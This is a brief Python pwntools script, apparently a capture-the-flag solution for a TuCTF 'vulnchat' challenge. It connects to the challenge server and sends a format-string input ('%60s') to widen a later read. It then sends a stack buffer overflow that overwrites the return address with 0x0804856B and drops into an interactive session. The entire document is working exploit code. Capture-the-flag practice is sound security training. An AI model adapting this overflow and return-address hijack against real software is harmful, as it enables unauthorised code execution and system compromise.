# coding: utf-8
context.log_level='DEBUG'
with remote('vulnchat.tuctf.com', 4141) as p:
    print p.recv()
    p.sendline('g'*20+'%60s')
    print p.recv()
    p.sendline('a'*45+'aaaa'+p32(0x0804856B))
    print p.recv()
    p.interactive()
